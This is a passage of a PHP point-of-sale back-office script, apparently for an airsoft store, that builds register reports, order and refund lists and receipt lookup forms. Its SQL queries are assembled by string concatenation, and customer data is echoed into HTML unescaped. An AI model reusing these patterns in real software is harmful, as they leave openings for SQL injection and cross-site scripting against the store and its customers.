          $ordersqueryraw = "SELECT o.orders_id FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $usersqueryinfo['pos_users_id'] . "' GROUP BY o.orders_id";
          $ordersquery = mysqli_query( $link, $ordersqueryraw );
          $totalorders = mysqli_num_rows( $ordersquery );
          if ( $totalorders == false ) { $totalorders = 0; }
          #echo '<h3 style="text-align:center;">' . $totalorders . ' orders</h3>';
          echo '<h3 style="text-align:center;"><a href="/store/index.php?action=daily_register&date=' . $paymentsdate . '&userid=' . $usersqueryinfo['pos_users_id'] . '">' . $totalorders . ' orders</a></h3>';
          $paymentscontent = '';
          $paymentscontents = array();
          $paymentsqueryraw = "SELECT ps.payments_store_method, COUNT( ps.payments_store_id ) AS payments_count, SUM( ps.payments_store_amount ) AS payments_total FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $usersqueryinfo['pos_users_id'] . "' GROUP BY ps.payments_store_method";
          $paymentsquery = mysqli_query( $link, $paymentsqueryraw );
          while ( $paymentsinfo = mysqli_fetch_array( $paymentsquery ) ) {
            if ( $paymentsinfo['payments_store_method'] == 'Change' ) { $paymentsinfo['payments_store_method'] = 'Cash'; }
            $paymentscontents[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
            #$paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $paymentsinfo['payments_store_method'] . '</td>';
            #$paymentscontent .= '<td style="text-align:right;">$' . number_format( $paymentsinfo['payments_total'], 2 ) . '</td>';
            #$paymentscontent .= '</tr>';
            #$paymentsdata[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
            #$paymentsdata['total'] += $paymentsinfo['payments_total'];
          }
          foreach ( $paymentscontents as $method => $amount ) {
            $paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $method . '</td>';
            $paymentscontent .= '<td style="text-align:right;">$' . number_format( $amount, 2 ) . '</td>';
            $paymentscontent .= '</tr>';
          }
          echo '<table style="width:100%;">' . $paymentscontent . '</table>';

          $refundscontent = "";
          $refundscontents = array();
          $refundsqueryraw = "SELECT oref.* FROM orders_refunds oref LEFT JOIN orders o ON oref.orders_id=o.orders_id WHERE oref.orders_refunds_date>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND oref.orders_refunds_date<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND oref.pos_users_id='" . $usersqueryinfo['pos_users_id'] . "'";
          $refundsquery = mysqli_query( $link, $refundsqueryraw );
          while ( $refundsinfo = mysqli_fetch_array( $refundsquery ) ) {
            if ( $refundsinfo['orders_refunds_type'] == 'products' || $refundsinfo['orders_refunds_type'] == 'products_tax' ) {
              $refundscontents[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'] * $refundsinfo['orders_refunds_qty'];
            }
            else {
              $refundscontents[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'];
            }
          }
          foreach ( $refundscontents as $method => $amount ) {
            $refundscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $method . '</td>';
            $refundscontent .= '<td style="text-align:right;">-$' . number_format( $amount, 2 ) . '</td>';
            $refundscontent .= '</tr>';
          }
          if ( $refundscontent != '' ) {
            if ( in_array( $loginuser, $adminusers ) ) {  echo '<h3 style="text-align:center;"><a href="/store/index.php?action=orderlist&date=' . $paymentsdate . '&type=refunds&user=' . $usersqueryinfo['pos_users_id'] . '">Refunds</h3>'; }
            else { echo '<h3 style="text-align:center;">Refunds</h3>'; }
            echo '<table style="width:100%;">' . $refundscontent . '</table>';
          }

          echo '</div>';
        }
        echo '</div>';
      }
      else {
        $orderscontent = "";
        $ordersqueryraw = "SELECT o.* FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=DATE_SUB( NOW(), INTERVAL 1 HOUR ) AND o.date_purchased<=NOW() AND ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $userinfo['pos_users_id'] . "' GROUP BY o.orders_id";
        $ordersquery = mysqli_query( $link, $ordersqueryraw );
        while ( $ordersinfo = mysqli_fetch_array( $ordersquery ) ) {
          $ordertotalsquery = mysqli_query( $link, "SELECT * FROM orders_total WHERE orders_id='" . $ordersinfo['orders_id'] . "' AND class='ot_total'" );
          $ordertotalsinfo = mysqli_fetch_array( $ordertotalsquery );
          $paymentmethods = '';
          $paymentsquery = mysqli_query( $link, "SELECT * FROM payments_store WHERE orders_id='" . $ordersinfo['orders_id'] . "' GROUP BY payments_store_method" );
          while ( $paymentsinfo = mysqli_fetch_array( $paymentsquery ) ) {
            if ( $paymentsinfo['payments_store_method'] == 'Change' ) { $paymentsinfo['payments_store_method'] = 'Cash'; }
            if ( !preg_match( '/' . $paymentsinfo['payments_store_method'] . '/', $paymentmethods ) ) {
              if ( $paymentmethods != '' ) { $paymentmethods .= ', '; }
              $paymentmethods .= $paymentsinfo['payments_store_method'];
            }
          }
          $orderscontent .= '<tr>';
          $orderscontent .= '<td>' . date( "g:i a", strtotime( $ordersinfo['date_purchased'] ) ) .  '</td>';
          $orderscontent .= '<td><a href="/store/index.php?action=print_receipt&orderid=' . $ordersinfo['orders_id'] . '" target="_blank">' . $ordersinfo['orders_id'] .  '</a></td>';
          #$orderscontent .= '<td>' . $ordersinfo['customers_email_address'] .  '</td>';
          $orderscontent .= '<td>' . $ordersinfo['customers_name'] .  '</td>';
          $orderscontent .= '<td>' . $paymentmethods .  '</td>';
          $orderscontent .= '<td style="text-align:right;">$' . number_format( $ordertotalsinfo['value'], 2 ) .  '</td>';
          $orderscontent .= '</tr>';
        }
        echo '<h2 style="text-align:center;">Recent Orders</h2>';
        echo '<div>';
        echo '<table style="margin-top:25px;width:100%;">' . $orderscontent . '</table>';
        echo '</div>';
      }
    }
    if ( $userid > 0 ) {
?>
   <h1>Daily Register Report</h1>
   <div>
    <div class="completecontent" style="width:620px;">
     <h2 style="text-align:center;"><?php echo $userinfo['pos_users_firstname'] . ' ' . $userinfo['pos_users_lastname']; ?></h2>
     <h3 style="text-align:center;"><b><?php echo date( "F j, Y (l)", strtotime( $paymentsdate ) ); ?></b><?php if ( $paymentsdate == date( "Y-m-d" ) ) { echo '<br/>As of ' . date( "g:ia" ); } ?></h3>
<?php
      echo '<div>';
      #echo '<div style="position:block;float:left;width:225px;min-height:200px;margin:10px;padding:10px;border:1px solid #000;">';
      $posuserquery = mysqli_query( $link, "SELECT * FROM pos_users WHERE pos_users_id='" . $userid . "'" );
      $posuserinfo = mysqli_fetch_array( $posuserquery );
      echo '<h3 style="text-align:center;"><b>' . $posuserinfo['pos_users_firstname'] . ' ' . $posuserinfo['pos_users_lastname'] . '</b></h3>';
      $firstorderquery = mysqli_query( $link, "SELECT o.date_purchased FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $userinfo['pos_users_id'] . "' ORDER BY o.date_purchased ASC LIMIT 1" );
      $firstorderinfo = mysqli_fetch_array( $firstorderquery );
      if ( $firstorderinfo['date_purchased'] != '' ) {
        $firstorderdisp = date( "g:ia", strtotime( $firstorderinfo['date_purchased'] ) );
      }
      $lastorderquery = mysqli_query( $link, "SELECT o.date_purchased FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $userinfo['pos_users_id'] . "' ORDER BY o.date_purchased DESC LIMIT 1" );
      $lastorderinfo = mysqli_fetch_array( $lastorderquery );
      if ( $lastorderinfo['date_purchased'] != '' ) {
        $lastorderdisp = date( "g:ia", strtotime( $lastorderinfo['date_purchased'] ) );
      }
      if ( $firstorderdisp != '' && $lastorderdisp != '' ) {
        echo '<h3 style="text-align:center;">' . $firstorderdisp . ' - ' . $lastorderdisp . '</h3>';
      }
      $ordersqueryraw = "SELECT o.* FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $userinfo['pos_users_id'] . "' GROUP BY o.orders_id";
      $ordersquery = mysqli_query( $link, $ordersqueryraw );
      $totalorders = mysqli_num_rows( $ordersquery );
      if ( $totalorders == false ) { $totalorders = 0; }
      echo '<h3 style="text-align:center;">' . $totalorders . ' orders</h3>';
      #echo '<h3 style="text-align:center;"><a href="/store/index.php?action=daily_register&date=' . $paymentsdate . '&userid=' . $usersqueryinfo['pos_users_id'] . '">' . $totalorders . ' orders</a></h3>';
      $paymentscontent = '';
      $paymentscontents = array();
      $paymentsqueryraw = "SELECT ps.payments_store_method, COUNT( ps.payments_store_id ) AS payments_count, SUM( ps.payments_store_amount ) AS payments_total FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ps.pos_users_id='" . $userinfo['pos_users_id'] . "' GROUP BY ps.payments_store_method";
      $paymentsquery = mysqli_query( $link, $paymentsqueryraw );
      while ( $paymentsinfo = mysqli_fetch_array( $paymentsquery ) ) {
        if ( $paymentsinfo['payments_store_method'] == 'Change' ) { $paymentsinfo['payments_store_method'] = 'Cash'; }
        $paymentscontents[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
        #$paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $paymentsinfo['payments_store_method'] . '</td>';
        #$paymentscontent .= '<td style="text-align:right;">$' . number_format( $paymentsinfo['payments_total'], 2 ) . '</td>';
        #$paymentscontent .= '</tr>';
        #$paymentsdata[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
        #$paymentsdata['total'] += $paymentsinfo['payments_total'];
      }
      foreach ( $paymentscontents as $method => $amount ) {
        $paymentscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $method . '</td>';
        $paymentscontent .= '<td style="text-align:right;">$' . number_format( $amount, 2 ) . '</td>';
        $paymentscontent .= '</tr>';
      }
      echo '<table style="width:100%;">' . $paymentscontent . '</table>';

      $refundscontent = "";
      $refundscontents = array();
      $refundsqueryraw = "SELECT oref.* FROM orders_refunds oref LEFT JOIN orders o ON oref.orders_id=o.orders_id WHERE oref.orders_refunds_date>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND oref.orders_refunds_date<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND oref.pos_users_id='" . $userinfo['pos_users_id'] . "'";
      $refundsquery = mysqli_query( $link, $refundsqueryraw );
      while ( $refundsinfo = mysqli_fetch_array( $refundsquery ) ) {
        if ( $refundsinfo['orders_refunds_type'] == 'products' || $refundsinfo['orders_refunds_type'] == 'products_tax' ) {
          $refundscontents[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'] * $refundsinfo['orders_refunds_qty'];
        }
        else {
          $refundscontents[$refundsinfo['orders_refunds_method']] += $refundsinfo['orders_refunds_amount'];
        }
      }
      foreach ( $refundscontents as $method => $amount ) {
        $refundscontent .= '<tr><td style="padding-right:20px;font-weight:bold;">' . $method . '</td>';
        $refundscontent .= '<td style="text-align:right;">-$' . number_format( $amount, 2 ) . '</td>';
        $refundscontent .= '</tr>';
      }
      if ( $refundscontent != '' ) {
        if ( in_array( $loginuser, $adminusers ) ) {  echo '<h3 style="text-align:center;"><a href="/store/index.php?action=orderlist&date=' . $paymentsdate . '&type=refunds&user=' . $userinfo['pos_users_id'] . '">Refunds</h3>'; }
        else { echo '<h3 style="text-align:center;">Refunds</h3>'; }
        echo '<table style="width:100%;">' . $refundscontent . '</table>';
      }

      $orderscontent = "";
      while ( $ordersinfo = mysqli_fetch_array( $ordersquery ) ) {
        $ordertotalsquery = mysqli_query( $link, "SELECT * FROM orders_total WHERE orders_id='" . $ordersinfo['orders_id'] . "' AND class='ot_total'" );
        $ordertotalsinfo = mysqli_fetch_array( $ordertotalsquery );
        $paymentmethods = '';
        $paymentsquery = mysqli_query( $link, "SELECT * FROM payments_store WHERE orders_id='" . $ordersinfo['orders_id'] . "' GROUP BY payments_store_method" );
        while ( $paymentsinfo = mysqli_fetch_array( $paymentsquery ) ) {
          if ( $paymentsinfo['payments_store_method'] == 'Change' ) { $paymentsinfo['payments_store_method'] = 'Cash'; }
          if ( !preg_match( '/' . $paymentsinfo['payments_store_method'] . '/', $paymentmethods ) ) {
            if ( $paymentmethods != '' ) { $paymentmethods .= ', '; }
            $paymentmethods .= $paymentsinfo['payments_store_method'];
          }
        }
        $orderscontent .= '<tr>';
        $orderscontent .= '<td>' . date( "g:i a", strtotime( $ordersinfo['date_purchased'] ) ) .  '</td>';
        $orderscontent .= '<td><a href="/store/index.php?action=print_receipt&orderid=' . $ordersinfo['orders_id'] . '" target="_blank">' . $ordersinfo['orders_id'] .  '</a></td>';
        #$orderscontent .= '<td>' . $ordersinfo['customers_email_address'] .  '</td>';
        $orderscontent .= '<td>' . $ordersinfo['customers_name'] .  '</td>';
        $orderscontent .= '<td>' . $paymentmethods .  '</td>';
        $orderscontent .= '<td style="text-align:right;">$' . number_format( $ordertotalsinfo['value'], 2 ) .  '</td>';
        $orderscontent .= '</tr>';
      }
      echo '<table style="margin-top:25px;width:100%;">' . $orderscontent . '</table>';
      echo '</div>';
    }
    if ( in_array( $loginuser, $adminusers ) ) {
?>
   <h2 style="padding-top:25px;text-align:center;clear:both;">Recent Register Reports</h2>
   <div>
    <div class="completecontent">
<?php
      $numdays = 14;
      if ( $loginuser == 8  ) { $numdays = 150; } # 90 days for Grace
      elseif ( $loginuser == 8 || $loginuser == 47 ) { $numdays = 90; } # 90 days for Grace and Jason
      elseif ( in_array( $loginuser, $adminusers ) ) { $numdays = 45; }
      $datecontent = '';
      for ( $i=1; $i<=$numdays; $i++ ) {
        $ordersquery = mysqli_query( $link, "SELECT DATE_SUB( CURDATE(), INTERVAL " . $i . " DAY ) AS order_date, COUNT( orders_id ) AS orders_total FROM orders WHERE date_purchased>=CONCAT( DATE_SUB( CURDATE(), INTERVAL " . $i . " DAY ), ' 00:00:00' ) AND date_purchased<=CONCAT( DATE_SUB( CURDATE(), INTERVAL " . $i . " DAY ), ' 23:59:59' ) AND ipisp='Evike.com Superstore'" );
        $ordersinfo = mysqli_fetch_array( $ordersquery );
        $paymentsdata = array();
        $paymentsquery = mysqli_query( $link, "SELECT ps.payments_store_method, COUNT( ps.payments_store_id ) AS payments_count, SUM( ps.payments_store_amount ) AS payments_total FROM orders o RIGHT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( DATE_SUB( CURDATE(), INTERVAL " . $i . " DAY ), ' 00:00:00' ) AND o.date_purchased<=CONCAT( DATE_SUB( CURDATE(), INTERVAL " . $i . " DAY ), ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' GROUP BY ps.payments_store_method" );
        while ( $paymentsinfo = mysqli_fetch_array( $paymentsquery ) ) {
          $paymentsdata[$paymentsinfo['payments_store_method']] += $paymentsinfo['payments_total'];
          $paymentsdata['total'] += $paymentsinfo['payments_total'];
        }
        if ( $ordersinfo['orders_total'] > 0 ) {
          $datecontent .= '<tr><td style="padding-right:20px;text-align:center;"><a href="index.php?action=daily_register&date=' . $ordersinfo['order_date'] . '">' . date( "n/d", strtotime( $ordersinfo['order_date'] ) ) . ' (' . substr( date( "D", strtotime( $ordersinfo['order_date'] ) ), 0, 3 ) . ')</a></td>';
          $datecontent .= '<td style="text-align:center;">' . $ordersinfo['orders_total'] . '</td>';
          $datecontent .= '<td style="padding-left:20px;text-align:right;">$' . number_format( $paymentsdata['total'], 2 ) . '</td>';
        }
      }
      echo '<table style="width:100%;"><tr><th>Date</th><th>Orders</th><th>Total</th></tr>' . $datecontent . '</table>';
?>
    </div>
   </div>
<?php
    }
  }
  elseif ( $action == 'daily_register' ) { echo '<h1>Error</h1><p style="text-align:center;">Invalid access to this page. Please try a different action.</p>'; }
  elseif ( ( $action == 'orderlist' || $action == 'rorderlist' || $action == 'worderlist' ) && in_array( $loginuser, $adminusers ) ) {
    $paymentsdate = date( "Y-m-d" );
    if ( $_REQUEST['date'] != '' && preg_match( '/^\d\d\d\d-\d\d-\d\d$/', $_REQUEST['date'] ) ) { $paymentsdate = $_REQUEST['date']; }
    $listtype = trim( $_REQUEST['type'] );
    $paymentmethod = trim( $_REQUEST['method'] );
    $user = trim( $_REQUEST['user'] );
    echo '<h3 style="text-align:center;"><b>' . date( "F j, Y (l)", strtotime( $paymentsdate ) ) . '</b></h3>';
    if ( $listtype == '' && $paymentmethod != '' ) {
      if ( $paymentmethod == 'cash' ) { $paymentmethod = 'Cash'; }
      elseif ( $paymentmethod == 'creditcard' ) { $paymentmethod = 'Credit Card'; }
      elseif ( $paymentmethod == 'giftcard' ) { $paymentmethod = 'Gift Card'; }
      elseif ( $paymentmethod == 'storecredit' ) { $paymentmethod = 'Store Credit'; }
      else { $paymentmethod = 'Store Credit'; }
      $ordersqueryraw = "SELECT o.* FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ps.payments_store_method='" . $paymentmethod . "' GROUP BY o.orders_id";
      if ( $action == 'rorderlist' ) { $ordersqueryraw = "SELECT o.* FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) ) AND ps.payments_store_method='" . $paymentmethod . "' GROUP BY o.orders_id"; }
      elseif ( $action == 'worderlist' ) { $ordersqueryraw = "SELECT o.* FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND o.customers_gid!='Tier 0' AND o.customers_id NOT IN ( 1194423, 1200305 ) AND ps.payments_store_method='" . $paymentmethod . "' GROUP BY o.orders_id"; }
    }
    elseif ( $listtype == 'refunds' ) {
      $ordersqueryraw = "SELECT o.* FROM orders o LEFT JOIN orders_refunds oref ON o.orders_id=oref.orders_id WHERE oref.orders_refunds_date>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND oref.orders_refunds_date<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND oref.orders_refunds_id IS NOT NULL";
      if ( $action == 'rorderlist' ) { $ordersqueryraw .= " AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) )"; }
      elseif ( $action == 'worderlist' ) { $ordersqueryraw .= " AND o.customers_gid!='Tier 0' AND o.customers_id NOT IN ( 1194423, 1200305 )"; }
      if ( (int)$user > 0 ) { $ordersqueryraw .= " AND oref.pos_users_id='" . (int)$user . "'"; }
      $ordersqueryraw .= " GROUP BY o.orders_id";
    }
    else {
      $ordersqueryraw = "SELECT o.* FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' GROUP BY o.orders_id";
      if ( $action == 'rorderlist' ) { $ordersqueryraw = "SELECT o.* FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND ( o.customers_gid='Tier 0' OR o.customers_id IN ( 1194423, 1200305 ) ) GROUP BY o.orders_id"; }
      elseif ( $action == 'worderlist' ) { $ordersqueryraw = "SELECT o.* FROM orders o LEFT JOIN payments_store ps ON o.orders_id=ps.orders_id WHERE o.date_purchased>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND o.date_purchased<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' ) AND o.ipisp='Evike.com Superstore' AND o.customers_gid!='Tier 0' AND o.customers_id NOT IN ( 1194423, 1200305 ) GROUP BY o.orders_id"; }
    }
    if ( $ordersqueryraw != '' ) {
      $ordersquery = mysqli_query( $link, $ordersqueryraw );
      $totalorders = mysqli_num_rows( $ordersquery );
      if ( $totalorders == false ) { $totalorders = 0; }
      echo '<h3 style="text-align:center;">' . $totalorders . ' orders</h3>';
      $orderscontent = "";
      while ( $ordersinfo = mysqli_fetch_array( $ordersquery ) ) {
        $ordertotalsquery = mysqli_query( $link, "SELECT * FROM orders_total WHERE orders_id='" . $ordersinfo['orders_id'] . "' AND class='ot_total'" );
        $ordertotalsinfo = mysqli_fetch_array( $ordertotalsquery );
        $paymentmethodtotal = 0;
        $paymentmethods = '';
        $paymentsquery = mysqli_query( $link, "SELECT * FROM payments_store WHERE orders_id='" . $ordersinfo['orders_id'] . "' GROUP BY payments_store_method" );
        while ( $paymentsinfo = mysqli_fetch_array( $paymentsquery ) ) {
          if ( $paymentsinfo['payments_store_method'] == 'Change' ) { $paymentsinfo['payments_store_method'] = 'Cash'; }
          if ( !preg_match( '/' . $paymentsinfo['payments_store_method'] . '/', $paymentmethods ) ) {
            if ( $paymentmethods != '' ) { $paymentmethods .= ', '; }
            $paymentmethods .= $paymentsinfo['payments_store_method'];
          }
          if ( $paymentmethod != '' && $paymentsinfo['payments_store_method'] == $paymentmethod ) { $paymentmethodtotal += $paymentsinfo['payments_store_amount']; }
        }
        if ( $listtype == 'refunds' ) {
          $refundamount = 0;
          $refundsquery = mysqli_query( $link, "SELECT * FROM orders_refunds WHERE orders_id='" . $ordersinfo['orders_id'] . "' AND orders_refunds_date>=CONCAT( '" . $paymentsdate . "', ' 00:00:00' ) AND orders_refunds_date<=CONCAT( '" . $paymentsdate . "', ' 23:59:59' )" );
          while ( $refundsinfo = mysqli_fetch_array( $refundsquery ) ) {
            if ( $refundsinfo['orders_refunds_qty'] == 0 ) { $refundamount += $refundsinfo['orders_refunds_amount']; }
            else { $refundamount += $refundsinfo['orders_refunds_amount'] * $refundsinfo['orders_refunds_qty']; }
          }
        }
        $ordernotes = '';
        $ordernotesquery = mysqli_query( $link, "SELECT * FROM orders_notes WHERE orders_id='" . $ordersinfo['orders_id'] . "' ORDER BY orders_notes_created DESC" );
        while ( $ordernotesinfo = mysqli_fetch_array( $ordernotesquery ) ) {
          if ( $ordernotes != '' ) { $ordernotes .= '<br/>'; }
          $ordernotesinfo['orders_notes'] = preg_replace( '/order\s?#?\s?(\d{7,8})/i', '<a href="/store/index.php?action=print_receipt&orderid=$1" target="_blank">Order #$1</a>', $ordernotesinfo['orders_notes'] );
          $ordernotesinfo['orders_notes'] = str_replace( "\n", '<br/>', $ordernotesinfo['orders_notes'] );
          $ordernotes .= $ordernotesinfo['orders_notes'];
        }
        $orderscontent .= '<tr>';
        $orderscontent .= '<td>' . date( "g:i a", strtotime( $ordersinfo['date_purchased'] ) ) .  '</td>';
        $orderscontent .= '<td><a href="/store/index.php?action=print_receipt&orderid=' . $ordersinfo['orders_id'] . '" target="_blank">' . $ordersinfo['orders_id'] .  '</a></td>';
        #$orderscontent .= '<td>' . $ordersinfo['customers_email_address'] .  '</td>';
        $orderscontent .= '<td>' . $ordersinfo['customers_name'] .  '</td>';
        $orderscontent .= '<td>' . $paymentmethods .  '</td>';
        $orderscontent .= '<td style="text-align:right;">$' . number_format( $ordertotalsinfo['value'], 2 ) .  '</td>';
        if ( $listtype == 'refunds' ) { $orderscontent .= '<td style="text-align:right;">-$' . number_format( $refundamount, 2 ) .  '</td>'; }
        elseif ( $paymentmethod != '' ) { $orderscontent .= '<td style="text-align:right;">$' . number_format( $paymentmethodtotal, 2 ) .  '</td>'; }
        $orderscontent .= '<td style="padding-left:10px;">' . $ordernotes .  '</td>';
        $orderscontent .= '</tr>';
      }
      echo '<style>.orderlisttable td {border-bottom:1px dotted #000;}</style>';
      echo '<table style="margin-top:25px;width:100%;" class="orderlisttable">';
      if ( $listtype == 'refunds' ) { echo '<tr><th>Time</th><th>Order</th><th>Customer</th><th>Payment</th><th>Total</th><th>Refund</th><th>Notes</th></tr>'; }
      elseif ( $paymentmethod != '' ) { echo '<tr><th>Time</th><th>Order</th><th>Customer</th><th>Payment</th><th>Total</th><th>' . $paymentmethod . '</th><th>Notes</th></tr>'; }
      else { echo '<tr><th>Time</th><th>Order</th><th>Customer</th><th>Payment</th><th>Total</th><th>Notes</th></tr>'; }
      echo $orderscontent . '</table>';
    }
    else { echo '<h1>Error</h1><p style="text-align:center;">Invalid request. Please try a different action.</p>'; }
    echo '</div>';
  }
  elseif ( $action == 'orderlist' ) { echo '<h1>Error</h1><p style="text-align:center;">Invalid access to this page. Please try a different action.</p>'; }

  # insert copy

  elseif ( $action == 'receipt_lookup' ) {
?>
   <h1>Receipt Lookup</h1>
   <div>
<?php
    if ( $searchcontent != '' ) {
      echo '<table style="margin:10px auto;" cellpadding="10">';
      echo $searchcontent;
      echo '</table>';
    }
    else {
?>
    <div class="completecontent">
     <form action="/store/index.php" method="post" id="checkoutform">
      <input type="hidden" name="action" value="receipt_lookup_submit" />
      <?php if ( $msg != '' ) { echo '<p class="message">' . $msg . '</p>'; } ?>
      <input type="tel" name="orderid" value="" class="orderlookup" placeholder="Order number" autofocus="autofocus" onblur="this.value=this.value.replace(/[^0-9]/g,'');" />
      <button onclick="this.form.submit();">View/Print Receipt</button>
     </form>
    </div>
<?php
    }
?>
    <div class="completecontent">
     <h3 style="text-align:center;">Search by Customer</h3>
     <form action="/store/index.php" method="post" id="checkoutform">
      <input type="hidden" name="action" value="receipt_lookup_customer" />
      <input type="text" name="name" value="" class="orderlookup" placeholder="Name" style="margin-bottom:5px;" />
      <input type="email" name="email" value="" class="orderlookup" placeholder="Email address" style="margin-bottom:5px;" />
      <input type="tel" name="phone" value="" class="orderlookup" placeholder="Phone number" onblur="this.value=this.value.replace(/[^0-9]/g,'');"style="margin-bottom:5px;"  />
      <input type="text" name="dlid" value="" class="orderlookup" placeholder="Driver License/ID" style="margin-bottom:5px;" />
      <input type="text" name="ccnum" value="" class="orderlookup" placeholder="Last 4 of Credit Card" style="margin-bottom:5px;" />
      <button onclick="this.form.submit();">Search</button>
     </form>
    </div>
<?php
    if ( $searchcontent == '' ) {
?>
    <h2 style="text-align:center;">Recent Store Orders</h2>
    <table style="margin:10px auto;width:auto;border-spacing:10px;">
<?php
    $recentorderquery = mysqli_query( $link, "SELECT * FROM orders WHERE date_purchased>DATE_SUB( NOW(), INTERVAL 2 HOUR ) AND ipisp='Evike.com Superstore' ORDER BY date_purchased LIMIT 15" );
    while ( $recentorderinfo = mysqli_fetch_array( $recentorderquery ) ) {
      echo '<tr>';
      echo '<td><a href="/store/index.php?action=receipt_lookup_submit&orderid=' . $recentorderinfo['orders_id'] . '">' . $recentorderinfo['orders_id'] .  '</a></td>';
      echo '<td>' . $recentorderinfo['customers_email_address'] .  '</td>';
      echo '<td>' . $recentorderinfo['customers_name'] .  '</td>';
      #echo '<td>' . date( "m/d/y g:i a", strtotime( $recentorderinfo['date_purchased'] ) ) .  '</td>';
      echo '<td>' . date( "g:i a", strtotime( $recentorderinfo['date_purchased'] ) ) .  '</td>';
      echo '</tr>';
    }
?>
    </table>
<?php
    }
?>
   </div>
<?php
  }
  elseif ( $action == 'refund_lookup' ) {
?>
   <h1>Refund Lookup</h1>
   <div>
    <div class="completecontent">
     <form action="/store/index.php" method="post" id="checkoutform">
      <input type="hidden" name="action" value="refund_lookup_submit" />
      <?php if ( $msg != '' ) { echo '<p class="message">' . $msg . '</p>'; } ?>
      <input type="tel" name="orderid" value="" class="orderlookup" placeholder="Order number" autofocus="autofocus" onblur="this.value=this.value.replace(/[^0-9]/g,'');" />
      <button onclick="this.form.submit();">View Refund Information</button>
     </form>
    </div>
   </div>
<?php
  }
  elseif ( $action == 'refund' ) {
?>
   <h1>Refund</h1>
<?php
  }
  elseif ( $action == 'storelabels' ) {
    $hideproductsearch = false;
    echo '<h1 class="donotprint">Print Store Product Labels</h1>';
    $barcode = trim( $_REQUEST['barcode'] );
    $barcode = str_replace( "'", "''", $barcode );
    $label = trim( $_REQUEST['label'] );
    $productid = '';
    if ( $barcode != '' ) {
